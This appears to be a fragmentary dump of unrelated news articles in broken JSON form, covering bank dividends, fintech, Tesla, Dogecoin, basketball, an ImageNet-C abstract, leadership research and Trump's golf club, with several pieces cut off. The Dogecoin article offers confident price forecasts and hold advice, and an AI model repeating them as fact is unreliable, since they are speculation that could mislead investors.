This current price represents a P/E ratio of 11.03, which is looking quite low, especially compared to its \u2018Big Four\u2019 stable mate Commonwealth Bank of Australia (ASX: CBA) , which is currently hovering around a P/E of 14.16. \nNAB\u2019s current dividend payout is $0.99 per share, which means NAB is yielding over 11% grossed-up. This dividend is huge and represents one of the largest yields amongst the top 50 ASX stocks (if not the entire ASX). But is this yield secure or is NAB going to be the next big dividend trap? \nWhat does a classic yield trap look like? \nIf you are an income investor, you will have probably had an extremely negative experience with the shares of Telstra Corporation Ltd (ASX: TLS) . Telstra cut its cherished dividend substantially in April 2017, from $0.31 per share to $0.22 (a cut of almost 30%), which prompted an instant free-fall in its share price. \nIf you had bought Telstra shares in March 2017 for income, you would have been the victim of this classic dividend trap \u2013 where a dividend yield is too good to be true and gets cut down the road. Dividend trap scenarios usually result in a substantial loss of capital, as the market can often be expected to re-price these stocks heavily to maintain the yield going forward. \nIs NAB a dividend trap? \nNAB\u2019s payout ratio is currently 85%, which means that the company is only keeping 15% of its profits for internal investment. \nThis ratio is relatively high and indicates that NAB has very little room to grow its dividend substantially in the short-term. In my opinion, it also means that if NAB\u2019s profits are disrupted (say by a housing slump), then it is very likely NAB will have to cut its dividend to make up the difference, as this already-high payout ratio doesn\u2019t provide much of a buffer. \nFoolish Takeaway \nOn current prices, buying NAB shares for the high yield alone is a risky choice in my opinion, considering NAB\u2019s vulnerability to any external economic shocks. Saying this, even if NAB cuts their current dividend yield, it would still likely be a good income stock going forward, albeit with potential capital loss from the share price. \nFor many, blue chip stocks mean stability, profitability and regular dividends, often fully franked... \nBut knowing which blue chips to buy, and when, can be fraught with danger. \nThe Motley Fool\u2019s in-house analyst team has poured over thousands of hours worth of proprietary research to bring you the names of \" The Motley Fool\u2019s Top 3 Blue Chip Stocks for 2019. \" \nEach one pays a fully franked dividend.

      "title": "TransferWise Offers Fast International Transfers From Argentina",
      "text": "FinTech unicorn TransferWise is now offering its money transfer services in Argentina, letting users move money to and from over 60 countries, the company said on its website and in a press release on Thursday (Aug. 15). \nFounded in London in 2011, TransferWise operates in Argentina in partnership with Nubi , a FinTech company associated with Banco Comafi . \nSending money to and from Argentina is typically complex, characterized by slow processes, less-than-optimal exchange rates and hidden fees. TransferWise , on the other hand, converts money at the mid-market exchange rate and pays the transfer using local pools of currencies in each country, using two local transfers instead of one international transaction. Because money never actually crosses any borders, users reap the benefits of low fees and speedy transfers. Prices vary depending on where funds are coming from, but the company says its service is as much as eight times less expensive than using a bank. \nThe digital process can also be completed just about anywhere using an Android or iPhone, with funds reaching the intended recipient in one to two working days. \nArgentina is Latin America\u2019s third-largest economy, and is predicted to go from a recession to 2.2 percent growth by 2020, Forbes said. With the upcoming presidential election in October, President Mauricio Macri\u2019s chances of success depend on a stable peso and a stable to growing economy. \nArgentina has suffered its fair share of economic setbacks, including a $3 billion trade deficit in 2015 as well as years of heavy state control and exchange rate fluctuations. But despite a recession, the country continued to hold its own as a global tech hub. \nIn January, Visa launched a new ePayment processing system in Argentina called VisaNet, which is at the forefront of blockchain adoption. Also, Chinese technology conglomerate Tencent has invested in Argentinian mobile banking startup Uala .",

      "text": "Homeis , a digital platform for immigrant communities, has raised a $12 million Series A round led by Canaan Partners and Spark Capital . \nFounded in 2017, the New York company says that more than 400,000 immigrants have used Homeis\u2019 app since its launch. Currently, the platform serves Israeli, French, and Indian communities in select cities across the U.S. The company plans to use the money in part to expand the communities it serves, with the goal of adding Hispanic and Latino communities in the U.S. later this year, and expanding to Europe in 2020. \nIsraeli immigrant Ran Haverno co-founded Homeis, which aims to essentially serve as a support system for immigrants, and do things like help them find new friends, jobs and recommendations for local services, providers and events via its \u201ccommunities.\u201d \nUsers are asked to provide their country of origin and current locale. All content is created and vetted by the community itself, based on its shared culture, the company said. \n\u201cOur focus is on building the most effective and authentic resource for foreign-born communities around the globe. So for now, Homeis is focused on growth as the highest priority,\u201d Haverno, who serves as the company\u2019s CEO, wrote via email. \u201cHowever, immigrants have a lot of specific needs that we believe the platform can support down the road such as wiring money back home, finding better insurance, visa and legal guidance, and many other services.\u201d \nHarnevo related an experience of two women within the Indian Homeis community in New York who managed to reconnect through the Homeis app in New York City after 22 years of not seeing each other. \nHarnevo founded Homeis after founding 5min Media , an online syndication platform that sold to AOL for $65 million in 2010. Harnevo then served as global president of AOL\u2019s video division before starting Homeis. \nThe company\u2019s other backers include Abstract VC, The Chernin Group , Samsung Next , Reddit co-founder Alexis Ohania n, AOL\u2019s former CEO Tim Armstrong , Taboola CEO Adam Singolda , and others. Homeis had previously raised a $4 million seed round in late 2017, which was also led by Spark Capital & Canaan. \nDown the line, the company aims to \u201cbe heavily integrated with fintech and digital services\u201d for immigrants. \n\u201cOur vision as a company is to build a diversified business model that is not relying on advertising, which will be integrated as well,\u201d Haverno said. \u201cImmigrants are facing a lot of challenges that we know from firsthand experience. Marrying them with the best service providers who understand their special needs will be the core of our monetization strategy.\u201d \nIllustration: Li-Anne Dias",

      "text": "Now that Samsung has established HDR10+ as a viable and accessible alternative to Dolby Vision HDR , it's looking to bring more HDR content to viewers. To do so, Samsung is partnering with Universal Pictures Home Entertainment (UPHE) to master a selection of new releases and existing movies and shows with the standard. Not only will we soon have more HDR10+ hardware, we'll also have something to watch on it. \nThe battle between Dolby Vision and HDR10+ has been waging for years. Both standards use \"dynamic metadata\" to adjust brightness on a scene-by-scene or frame-by-frame basis. The most touted benefit is that dark scenes can look more like their creator originally intended. Dolby Vision has a slightly wider color range and a higher maximum nit brightness, but the company charges royalties. HDR10+ is royalty free, and the partners behind it have opened a licensing and certification logo program to other TV manufacturers. \nWhile we're getting closer to the hardware being in more living rooms, the only HDR10+ content so far is the Amazon Prime Video HDR catalog. Previously, 20th Century Fox agreed to bring the standard to its new releases, but we haven't seen any yet. Now we can be on the lookout for UPHE movies and shows in HDR10+, too. That means you could see films like Green Book in a whole new way -- though it's hard to say when. \nSource: Samsung",

      "title": "Trump loves coal, hates climate action but investors are fighting back",
      "text": "President Donald Trump loves climate-wrecking coal and hates the climate-saving Paris Agreement. \nMeanwhile, forward-looking impact investors hate the problems of burning coal and its financial downside \u2013 and love portfolios of companies and funds pursuing climate solutions, which can have stronger returns. \nThis love-hate split has motivated investors \u2013 and eco-focused ESG investment funds \u2014 seeking to save the planet from Trump's policies. (Note: ESG stands for \"environmental, social and governance.\") \nIn fact, $12 trillion \u2014 or $1 in every $4 of assets professionally managed in the U.S. \u2014 is invested in portfolios seeking to be sustainable, responsible and impactful. This is up 38 percent since 2016 and up 18 times since 1995, and it includes more than 180 mutual funds and dozens of exchange-traded funds, according to the US SIF Foundation , the socially responsible investing industry trade association. \nMore from Impact Investing: \nFrom ESG to SRI, decoding impact investing lingo \nWhy investors like Bezos and Gates pour money into clean tech \nWhat Warren Buffett thinks about climate change \nWhile Trump seems to hate science, investors are loving physics genius Isaac Newton's third law of motion: \"For every action, there is an equal and opposite reaction.\" \nTrump's August 2018 \"affordable clean energy\" rule seeks to transfer pollution-control laws to the states, likely to result in more polluted air and rivers.

      "title": "Tesla's Vertical Integration Unlocks Hidden Flexibility & Innovation \u2014 #CleanTechnica Field Trip",
      "text": "Tesla\u2019s Vertical Integration Unlocks Hidden Flexibility & Innovation \u2014 #CleanTechnica Field Trip \nMarch 30th, 2019 by Kyle Field \nThe 1990s and early 2000s saw companies around the world extending their supply chains into global markets in a way that the world had never seen before, or perhaps even imagined. The business models that emerged from the outsourcing movement were spread far and wide, with central organizations extending some semblance of control of their supply chains through quality spec sheets, service level agreements, and detailed supplier contracts. \nImage Credit: Kyle Field, CleanTechnica \nSourcing sub-assemblies, parts, and components from the lowest-cost supplier put global suppliers head to head, and over time, resulted in fewer and fewer suppliers as globally dominant companies emerged in each segment of the market. The automotive industry is an example of this outsourcing, with parts coming from all over the world to be bolted into \u201cAmerican-made\u201d vehicles like the Chevrolet Bolt, which only sources 26% of its components from the US and Canada, with the bulk of the car (54%) coming from LG in Korea. \nTesla learned the hard way through the development of the Tesla Model X that sourcing 10,000 components from hundreds or thousands of globally distributed suppliers quickly turns into an exercise in herding cats . Stack on top of that the complexities of global shipments and logistics and you can already start to feel the grey hairs popping out by the minute. \nTo solve for this complex equation, Tesla began stacking suppliers. Instead of just one supplier for bolts, Tesla lined up two or three suppliers to dilute the risk and increase the chances of success. In April 2016, we said of the chaos that \u201cunsatisfactory supplier capability validation, and the company\u2019s lack of in-house manufacture ability for many of the parts in question\u201d was to blame for the delayed ramp up of Model X production. Tesla learned its lesson and has the scars to show for it. \n\u201cIt\u2019s complicated.\u201d Image Credit: Tesla \nThe Model X dragged the company over rocky roads and through fields of thorns. After coming out the other side to lick its wounds, Tesla had learned a valuable lesson about global supply chains, supplier validation, and perhaps most importantly, the value of not being afraid of just doing things yourself where it makes sense to do so. \nTesla is not building the same vehicles that others have built for the last 50 years in the automotive industry. This stems from the belief that each and every decision should be analyzed, verified, cross-checked, and continuously, rigorously scrutinized. This comes from a fundamental belief in \u201cfirst principles\u201d thinking that strives to start from the foundational principles that underpin their solutions, one at a time, from the ground up. \nThis thinking has led to a completely new type of vehicle, with seats, batteries, motors and windows that are are all different than the competition. Different does not equate to better, but in this case, it is this unique approach that sets Tesla apart, above the competition. Tesla\u2019s desire to put the best seats in their vehicles led it to bring seat manufacturing in-house, taking full control over a critical piece of the vehicle experience into the hands of Tesla\u2019s experts. \nImage Credit: Zach Shahan, CleanTechnica \nCleanTechnica toured Tesla\u2019s seat factory in March and we were impressed that the seat factory, located just two and a half miles from Tesla\u2019s Fremont factory, was brought online in a matter of months as one part of the solutions to the supplier issues Tesla experienced with the Model X. \nComing out of the challenging Model X production ramp, Tesla CEO Elon Musk said on the Q1 2016 earnings call in May 2016 that, \u201cI think we\u2019re actually going to increase the amount of vertical integration that we have. I think it\u2019s very important for us to have the ability to produce almost any part on the car at will, because it alleviates risk with suppliers, where, going back to if 2% of suppliers aren\u2019t ready, we can\u2019t make the car. Having the ability internally to adapt and make that 2% of parts internally really massively reduces risks associated with the production ramp. That I think is a very important thing.\u201d \nBringing seats in-house meant standing up a completely new factory in Tesla home state of California, where wages are significantly higher than in supplier countries. The offset to higher wages is lower transportation and logistics expenses, as Tesla no longer ships seats around the world. \nTesla currently employs a fleet of diesel semi trucks to move the seats the 2.5 miles to its Fremont factory, but talk of an underground tunnel from the seat factory to the main auto factory would allow for a direct line and an automated conveyor, slashing shipping costs even further. These types of optimizations simply are not possible when dealing with an outside supplier, and they support Tesla\u2019s move towards pulling more and more of its critical manufacturing processes under a red, white, and grey Tesla roof. \nThe benefits at Tesla go far beyond just improving shipping costs, as bringing more of the company\u2019s parts manufacturing in-house gives Tesla infinitely more flexibility in pushing improvements into its products than it would have purchasing them from a supplier. Tesla rather famously pushes 20+ improvements per week into its vehicles in a river of continuous improvement that allows the Silicon Valley company to not only improve the cost of its products, but also the efficiency, throughput, and quality of those products. \nEstablishing a culture of continuous improvement is very much in line with the wonderful world of software development, where the agile methodology provides a framework for requirement gathering, iterative development, functionality validation, testing, and deployment. The mindset at Tesla is the same, with everyone we spoke with at the factory commenting on just how much focus Tesla puts on continuous improvement in manufacturing. Vertical integration grants Tesla more control over more details of its manufacturing process and allows Tesla to respond much faster to potential improvements and at a lower cost. \nImage Credit: Kyle Field & Chanan Bos, CleanTechnica \nManufacturing flexibility, lower cost parts, and innovative products have allowed Tesla to push to the front of not just the electric vehicle revolution, but to additionally displace the competition in mid-sized luxury vehicles and even in all passenger vehicles in the entire state of California and several countries in Europe. A Tesla spokesperson told CleanTechnica that, \u201cThe number of labor hours needed to complete a vehicle has decreased 33% since early 2016. Of the 250,000 Tesla vehicles ever produced, more than half were built in the past 18 months. Whereas before, it took three shifts with considerable overtime to produce our target annual production of 100,000 Model S and X vehicles, now it can be done with only two shifts and minimal overtime.\u201d \nAbout the Author \nKyle Field I'm a tech geek passionately in search of actionable ways to reduce the negative impact my life has on the planet, save money and reduce stress.

      "title": "Elon Musk's Joke Might Have Pushed the Price, but It's Not the Only Factor for a Bullish Future of Dogecoin (DOGE)",
      "text": "Dogecoin (DOGE) is one of the major cryptocurrencies of contemporary time as it deals with transactions based on online social media specific contents. It was created after being taken out of Litecoin in 2013. The major features of this crypto include complete anonymity of the users and swift transactions. This has been able to provide a substitute payment and settlement ecosystem for social media content creators and clients specific to Twitter and Reddit. The theme and logo of Dogecoin (DOGE) are based on \u201c Doge \u201c- a popular internet meme of a Shiba Inu dog. The creators of the coin are Billy Markus from Portland, Oregon and Jackson Palmer from Sydney, Australia- they aim to take the market leading place of Bitcoin. \nElon Musk\u2019s Joke \u2013 \nThe starting of April was really positive for Dogecoin (DOGE). On April 1 st , Dogecoin posted an April fool\u2019s Day Poll asking who should be the next CEO of Dogecoin. People voted highest for automobile major Tesla\u2019s CEO Elon Musk. In response to that poll, Elon Musk tweeted light-heartedly that Dogecoin (DOGE) is the best crypto coin in the market. Soon, the statement traveled like fire finally pushing the price of the coin to a very high level. The almost 100 % growth in the value left many experts and crypto enthusiasts in shock. The whole crypto market has inflated after April 1 st , but near 100 % growth was not according to the market. \nWe have listened to your concerns. We have decided that Dogecoin does need a CEO. Someone who can lead us into the future while maintaining the core values of what we are. \nBelow are the candidates, vote wisely. @VitalikButerin @SatoshiLite @elonmusk @MarshallHayner \n\u2014 Dogecoin (@dogecoin) April 1, 2019 \nNow the fire seems to have dozed off. The coin has been stable for the past week. But it is now being traded with more price than before the April fool episode. It has gained almost 40 % on the previous price. All thanks to market interruption by Elon Musk with one joke. It should be noted that Elon Musk was recently penalized by the SEC (Securities Exchange Commission) for interrupting market trend of Tesla\u2019s share by making false statements on Twitter. This cost Elon Musk $20 million and Chairmanship over Tesla\u2019s board. \nTrust Wallet has trusted the Doge- \nTrust Wallet- a major crypto wallet backed by Binance coin has decided to add Dogecoin (DOGE) in its wallet. It said that the vibrant and amazing community of Dogecoin (DOGE) would be welcomed to Trust Wallet. Trust Wallet is considered as one of the few efficient wallets. It has many major cryptocurrencies like Bitcoin, Ethereum, Litecoin, Tron, XRP and all ERC20 tokens currently. Trust Wallet assures to store digital assets along with the private keys. It also offers complete anonymity of the users and privacy is of paramount priority. \nVery science. Many community. So Amaze !! Trust Wallet now supports #Dogecoin @dogecoin \ud83d\udc49 https://t.co/YPil5NFuV9 pic.twitter.com/6MAI8Wi7xv \n\u2014 Trust \u2013 Crypto Wallet (@TrustWalletApp) April 17, 2019 \nThe addition of Dogecoin (DOGE) is positive news for the coin. This might not have swelled the market value for now, but it has definitely managed to push the goodwill of the coin. \nDogecoin\u2019s Charity Angle- \nDogecoin (DOGE) has finally put its name to the perfect use. Dogecoin has recently tied up with Huobi, Huobi Global\u2019s U.S. crypto exchange for raising money in order to provide funding for Grateful Dogs Rescue, a dog shelter based at San Francisco. \nIt's official: Huobi Global lets the #dogecoin out! \nDeposit your Dogecoin ( $DOGE ) now! \nDetails here: https://t.co/uD2q4Uo04o @dogecoin @ummjackson @elonmusk #HAPPENINGNOW #cryptocurrency #HuobiGlobal pic.twitter.com/lwtPNQYuYN \n\u2014 HuobiGlobal (@HuobiGlobal) April 4, 2019 \nAccording to the joint press release, Huobi plans to give a Dogecoin each to the users who pass the verification in signing up process. It also would give 1,000 DOGE for each registered user to the shelter house with a limit of $5000. \n\u201cDogecoin has become the darling of the cryptocurrency community with an impressive market cap that currently exceeds USD 350 million,\u201d said Frank Fu, the CEO of Huobi.com operator HBUS. \u201cWe are excited to support projects that have such widespread appeal, and we will continue to expand our token variety aggressively.\u201d \nDogecoin has also said that they were looking forward to the association aimed at a good cause. The tie-up is consonance with the Dogecoin\u2019s strong values and commitment towards charity. \nMajor Dogecoin Wallets- \nHere are Top 2 Dogecoin Wallets in the Crypto Market \u2013 \nTrezor- \nTrezor is one of the most trusted and efficient hardware wallets for Dogecoin (DOGE). Along with Dogecoin, it has almost 700 other major cryptocurrencies in its bucket list. SatoshiLabs of Czech Republic back it. It emphasizes the most on privacy and security. The private keys to the crypto coins are kept in the device the app is installed in. So, it makes it tough to be hacked. \nDogecoin Paper Wallet- \nThis wallet is known as the old school crypto wallet. The private keys to the coins stored are printed on a piece of paper. This makes the app safer as it is not connected to the web. The onus is rested with the user to keep the private keys safe in order to have his investment safe. \nCurrent Statistics- \nDogecoin (DOGE) is the 26 th largest crypto coin in the global crypto market. \nIt has an ROI (Return on Investment) of 407.91 %. \nThe total coins in current circulation stand at 119,127,654,673 DOGE. \nThe current market cap as on 18 th April at 04:19 UTC stands at 338,161,230 USD. \nThe value of each coin in terms of USD and BTC are 0.002839 USD and 0.00000054 BTC. \nThe 24 h Volume at the same UTC stands at 32,322,103 USD. \nComparison- \nDogecoin (DOGE) has been a consistent performer since its inception. The coin was never intended to be a major crypto coin as this was often described as a coin made out of the fun. However, the first uptrend was seen in May 2017. And the biggest gain could be seen during the crypto boom. It gained around 100 % in the period of 6 months. But the effect of crypto winter was huge on Dogecoin. \nIn recent times, the major gain was achieved after April 1 st after the April fool episode. The market cap on 18 th March was 246,163,496 USD. And the value of each coin was 0.002074 USD and 0.00000052 BTC. The current market cap is 37.37 % more than the market cap of 18 th March. And the value of each coin in terms of USD has increased by 36.88 % in the last 30 days. \nPrediction- \nDogecoin (DOGE) is now being traded around 0.002 USD. But the price of the coin is likely to increase further. But this growth will be gradual. The next resistance can be faced at 0.003 USD. The short term outlook is bearish as the effect of the April 1 st episode has not completely worn out. But the medium and long term outlook is bullish. The end of this quarter may see the value somewhere around 0.01 USD. \nAs per our prediction, the coin should be there at 0.055 USD at the end of this year. It is a very bullish sign for the long term holders. And the 2020 price prediction goes with a whopping 5855 % increase in the price. The value may reach as high as 0.225 USD by the end of 2020. \nConclusion- \nWe are pleased to announce that Dogecoin #DOGE is now on CoinAll. #BTC / #ETH #Crypto \nThe schedule: \nDeposit-17:00 April 15th (HKT, UTC +8) \nSpot trading \u2013 17:00 April 16th (HKT, UTC +8) \nWithdrawal \u2013 17:00 April 17th (HKT, UTC +8) \nFor more information: https://t.co/HgY8471gMi pic.twitter.com/1DCzWTXbFI \n\u2014 CoinAll (@CoinallU) April 15, 2019 \nDogecoin (DOGE) is available for buying in many major exchanges like CoinAll, FEX, FatBTC, ZBG, and P2PB2B. Dogecoin is extensively being traded in these major exchanges. Looking at the price trend and analysis, we advise the short term investors to wait for some more time to book the coin. The price may further take a dip. But, medium-term holders must have benefitted from the April 1 st surge. We advise them to hold the current holdings until the end of 2019. It will give more than expected dividends.",

      "title": "He's Kevin Durant, and you're not",
      "text": "LOS ANGELES -- When Kevin Durant first joined the Golden State Warriors nearly three years ago, he went through a bit of an adjustment period with his new teammates and coaches. \nThey'd go out of their way to make him feel comfortable in his new surroundings, often at their own expense on the offensive end. He'd go out of his way not to step on toes, as the new guy trying to blend into what was already a historically great team. It was rather sweet -- an example of Golden State's camaraderie that was so celebrated at the beginning of this dynastic run. \nAnd then sometime after the Warriors lost on Christmas Day to the Cleveland Cavaliers in 2016, everybody stopped being polite and started getting real: Kevin Durant is the best pure scorer on the planet, and the sooner everybody started embracing that, the better it would be for all of them. \nThat much is still true. And it's what Durant reminded the world of Thursday night at Staples Center in Golden State's 132-105 drubbing of the LA Clippers in Game 3 of their first-round Western Conference playoff series, giving the Warriors a 2-1 series lead. \nAfter shooting only eight times in Golden State's Game 2 meltdown, Durant came out aggressively from the opening tip and finished with a game-high 38 points on 14-of-23 shooting. Durant didn't even need to take the court in the fourth quarter. \nDurant hit all of his first five shots, scored or assisted on 51 percent of Golden State's 73 points in the first half and put to rest any notion that Clippers pesky defender Patrick Beverley had gotten into his head by making 3 of 4 shots when defended by Beverley. According to Second Spectrum tracking, Durant is now 9-of-13 shooting (69 percent) when defended by Beverley in this series. \n\"I don't really talk about other players during the series,\" Warriors power forward Draymond Green told ESPN, when asked about Beverley. \"But I like Kevin in that matchup, regardless of what [Beverley] does. I like Kevin in any matchup, with whoever. Anytime. Period. \n\"No one's defense matters, by the way. I've been on the other side of that [defensive matchup with Durant] and mine didn't either. I like that matchup with anybody.\" \nGreen was referencing the years he spent defending Durant, when Durant was a member of the Oklahoma City Thunder . And so much has happened since then. \nDurant has won two NBA Finals MVP awards because he had dominant games like he had Thursday when the Warriors needed him most. \nWhenever LeBron James or the Cavs seemed as if they might have a way to solve the Warriors, Durant was their trump card. \nAnd when he summons performances the way he did Thursday night, or in Game 3 of the 2017 Finals or Game 3 of the 2018 Finals, it makes you shake your head and wonder how anyone ever stops him. \nIt's also why he gets questioned so harshly after passive performances, such as he had in Game 2. Stephen Curry 's foul trouble had just as much to do with why the Warriors squandered their 31-point lead. Same goes for Klay Thompson 's quiet night, or the team's lack of focus defensively during the Clippers' comeback. \nBut the lion's share of criticism after Game 2 rested on Durant's shoulders, to which he said simply: \"I'm Kevin Durant. You know who I am. Y'all know who I am.\" \nAnd he then proceeded to remind everyone of what that means: As the best scorer in the world, Durant can pretty much take over any game, against any defender, whenever he's locked in and his teammates and coaches run plays that free him up to do that. \n\"Mostly it's just trying to get him in the right positions,\" Curry said. \"We all know what spots to be in on the floor, where to space, things like that. It allows him to be more aggressive.\" \nYes, Durant was passive in Game 2. But he does that sometimes, getting lost in the Warriors' offensive flow. It had actually been happening a lot lately, as Durant took 10 or fewer shots in six of his past 12 games. He was focused on playmaking, on the way the team was playing, not getting his. And as he said the other day, the Warriors were playing great, so why change just because Beverley was trying to troll him? \nIn simpler times, without the threat of his impending free agency hanging over them, Thursday's performance would be seen as the Warriors and Durant coming together as they gear up for another championship run -- the latest example of that Warriors camaraderie. \nBut as the context has changed, so has the interpretation. \nDurant is so good, it is nearly impossible to compartmentalize his future from his present. And for that matter, Golden State's future with or without him, from their present as they try to win a fourth title in five years. \nThat is the Warriors' challenge this season though: to find some Zen in the midst of the maelstrom that awaits them this summer. Maybe it's enough just to stay in the moment and appreciate Durant's brilliance on nights like this. \nAs Warriors coach Steve Kerr said before the game, \"I grew up right here in Los Angeles and when I was 10 years old I watched UCLA beat Kentucky for the national championship. It was their 10th national title in 12 years, and at 10 years old and as a UCLA fan I thought that's going to happen forever, that's going to go on forever. [John] Wooden retired after the game and they've won one national title since. \n\"But I think the reason people are so attracted to sports is that none of us know what's going to happen. You do your best to build a good team and a solid team, and you hope to get some luck along the way. And I think we've done that and we've experienced the luck, and the bad luck, and it's all part of it. You don't worry about expectations, you just go out there and play and do your best and see if you can sustain it for a long time. But everything comes to an end and we're just trying to keep this going as long as we can.\"",

Our first benchmark, ImageNet-C, standardizes and expands the corruption robustness topic, while showing which classifiers are preferable in safety-critical applications. Then we propose a new dataset called ImageNet-P which enables researchers to benchmark a classifier's robustness to common perturbations. Unlike recent robustness research, this benchmark evaluates performance on common corruptions and perturbations not worst-case adversarial perturbations. We find that there are negligible changes in relative corruption robustness from AlexNet classifiers to ResNet classifiers. Afterward we discover ways to enhance corruption and perturbation robustness. We even find that a bypassed adversarial defense provides substantial common perturbation robustness. Together our benchmarks may aid future work toward networks that robustly generalize.",

      "title": "Why Inclusive Leaders Are Good for Organizations, and How to Become One",
      "text": "Executive Summary \nCompanies increasingly rely on diverse, multidisciplinary teams that combine the collective capabilities of women and men, people of different cultural heritage, and younger and older workers. But simply throwing a mix of people together doesn\u2019t guarantee high performance; it requires inclusive leadership \u2014 leadership that assures that all team members feel they are treated respectfully and fairly, are valued and sense that they belong, and are confident and inspired. Research involving 3,500 ratings by employees of 450 leaders found that inclusive leaders share six behaviors \u2014 and that leaders often overestimate how inclusive they really are. These are the behaviors: visible commitment, humility, awareness of bias, curiosity about others, cultural intelligence, and effective collaboration. \nCompanies increasingly rely on diverse, multidisciplinary teams that combine the collective capabilities of women and men, people of different cultural heritage, and younger and older workers. But simply throwing a mix of people together doesn\u2019t guarantee high performance; it requires inclusive leadership \u2014 leadership that assures that all team members feel they are treated respectfully and fairly, are valued and sense that they belong, and are confident and inspired. \nInclusiveness isn\u2019t just nice to have on teams. Our research shows that it directly enhances performance. Teams with inclusive leaders are 17% more likely to report that they are high performing, 20% more likely to say they make high-quality decisions, and 29% more likely to report behaving collaboratively. What\u2019s more, we found that a 10% improvement in perceptions of inclusion increases work attendance by almost 1 day a year per employee, reducing the cost of absenteeism. \nWhat specific actions can leaders take to be more inclusive? To answer this question, we surveyed more than 4,100 employees about inclusion, interviewed those identified by followers as highly inclusive, and reviewed the academic literature on leadership. From this research , we identified 17 discrete sets of behaviors, which we grouped into six categories (or \u201ctraits\u201d), all of which are equally important and mutually reinforcing. We then built a 360-degree assessment tool for use by followers to rate the presence of these traits among leaders. The tool has now been used by over 3,500 raters to evaluate over 450 leaders. The results are illuminating. \nThese are the six traits or behaviors that we found distinguish inclusive leaders from others: \nVisible commitment: They articulate authentic commitment to diversity, challenge the status quo, hold others accountable and make diversity and inclusion a personal priority. \nHumility: They are modest about capabilities, admit mistakes, and create the space for others to contribute. \nAwareness of bias: They show awareness of personal blind spots as well as flaws in the system and work hard to ensure meritocracy. \nCuriosity about others: They demonstrate an open mindset and deep curiosity about others, listen without judgment, and seek with empathy to understand those around them. \nCultural intelligence: They are attentive to others\u2019 cultures and adapt as required. \nEffective collaboration: They empower others, pay attention to diversity of thinking and psychological safety, and focus on team cohesion. \nThese traits may seem like the obvious ones, similar to those that are broadly important for good leadership. But the difference between assessing and developing good leadership generally versus inclusive leadership in particular lies in three specific insights. \nFirst, most leaders in the study were unsure about whether others experienced them as inclusive or not. More particularly, only a third (36%) saw their inclusive leadership capabilities as others did, another third (32%) overrated their capabilities and the final third (33%) underrated their capabilities. Even more importantly, rarely were leaders certain about the specific behaviors that actually have an impact on being rated as more or less inclusive. \nSecond, being rated as an inclusive leader is not determined by averaging all members\u2019 scores but rather by the distribution of raters\u2019 scores. For example, it\u2019s not enough that, on average, raters agree that a leader \u201capproaches diversity and inclusiveness wholeheartedly.\u201d Using a five-point scale (ranging from \u201cstrongly agree\u201d to \u201cstrongly disagree\u201d), an average rating could mean that some team members disagree while others agree. To be an inclusive leader, one must ensure that everyone agrees or strongly agrees that they are being treated fairly and respectfully, are valued, and have a sense of belonging and are psychologically safety. \nThird, inclusive leadership is not about occasional grand gestures, but regular, smaller-scale comments and actions. By comparing the qualitative feedback regarding the most inclusive (top 25%) and the least inclusive (bottom 25%) of leaders in our sample, we discovered that inclusive leadership is tangible and practiced every day. \nThese verbatim responses from our assessments illustrate some of the tangible behaviors of the most inclusive leaders in the study. \nShares personal weaknesses: \u201c[This leader] will openly ask about information that she is not aware of. She demonstrates a humble unpretentious work manner. This puts others at ease, enabling them to speak out and voice their opinions, which she values.\u201d \nLearns about cultural differences: \u201c[This leader] has taken the time to learn the ropes (common words, idioms, customs, likes/dislikes) and the cultural pillars.\u201d \nAcknowledges team members as individuals : \u201c[This leader] leads a team of over 100 people and yet addresses every team member by name, knows the work stream that they support and the work that they do.\u201d \nThe following verbatims illustrate some of the behaviors of the least inclusive leaders: \nOverpowers others: \u201cHe can be very direct and overpowering which limits the ability of those around him to contribute to meetings or participate in conversations.\u201d \nDisplays favoritism: \u201cWork is assigned to the same top performers, creating unsustainable workloads. [There is a] need to give newer team members opportunities to prove themselves.\u201d \nDiscounts alternative views : \u201c[This leader] can have very set ideas on specific topics. Sometimes it is difficult to get an alternative view across. There is a risk that his team may hold back from bringing forward challenging and alternative points of view.\u201d \nWhat leaders say and do has an outsized impact on others, but our research indicates that this effect is even more pronounced when they are leading diverse teams. Subtle words and acts of exclusion by leaders, or overlooking the exclusive behaviors of others, easily reinforces the status quo. It takes energy and deliberate effort to create an inclusive culture, and that starts with leaders paying much more attention to what they say and do on a daily basis and making adjustments as necessary. Here are four ways for leaders to get started: \nKnow your inclusive-leadership shadow: Seek feedback on whether you are perceived as inclusive, especially from people who are different from you. This will help you to see your blind spots, strengths, and development areas. It will also signal that diversity and inclusion are important to you. Scheduling regular check-ins with members of your team to ask how you can make them feel more included also sends the message. \nBe visible and vocal: Tell a compelling and explicit narrative about why being inclusive is important to you personally and the business more broadly. For example, share your personal stories at public forums and conferences. \nDeliberately seek out difference: Give people on the periphery of your network the chance to speak up, invite different people to the table, and catch up with a broader network. For example, seek out opportunities to work with cross-functional or multi-disciplinary teams to leverage diverse strengths. \nCheck your impact: Look for signals that you are having a positive impact. Are people copying your role modeling? Is a more diverse group of people sharing ideas with you? Are people working together more collaboratively? Ask a trusted advisor to give you candid feedback on the areas you have been working on. \nThere\u2019s more to be learned about how to become an inclusive leader and harness the power of diverse teams, but one thing is clear: leaders who consciously practice inclusive leadership and actively develop their capability will see the results in the superior performance of their diverse teams.",

      "title": "Trump visits his for-profit golf course during California trip for dinner with son, local officials",
      "text": "Jonathan O'Connell \nReporter covering economic development with a focus on commercial real estate and the Trump Organization \nApril 5 at 2:58 PM \nPresident Trump plans to have dinner at his for-profit golf course in Rancho Palos Verdes, Calif., Friday night, with his son Eric Trump, the city council and dozens of friends and supporters, according to one person who was told about the gathering. \nTrump is in the middle of a West Coast trip, which will also include stops at the U.S.-Mexico border and fundraisers in Beverly Hills. His official White House schedule has a blank spot from about 6:30 p.m. to 9:30 p.m. It appears Trump will take that time to make a side trip to his golf club in Rancho Palos Verdes, Calif. \nTrump\u2019s dinner \u2014 which would be his first visit to the California course as president \u2014 comes at a pivotal moment for that club, which is one of the largest new development opportunities for the company since Trump took office and said he handed control of the company to his sons, Eric and Don Jr. \nOnce, Trump envisioned the seaside course as a rival to Pebble Beach. But it has suffered from blue-state backlash since Trump entered politics, with charity tournaments departing and golf-revenue declining. \nNow, the Trump Organization faces a critical choice: how, and when, to develop 23 newly-approved home lots on the course\u2019s west side. \nBut now that he is president, the Trump Organization says Trump is no longer involved in that sort of decision. \n\u201cEverything he does is for the good of the American people \u2014 he has zero involvement in the Trump Organization,\u201d Eric Trump told Forbes Magazine last year. \nInvitees to Friday\u2019s dinner include members of the Rancho Palos Verdes City Council, said the person, who 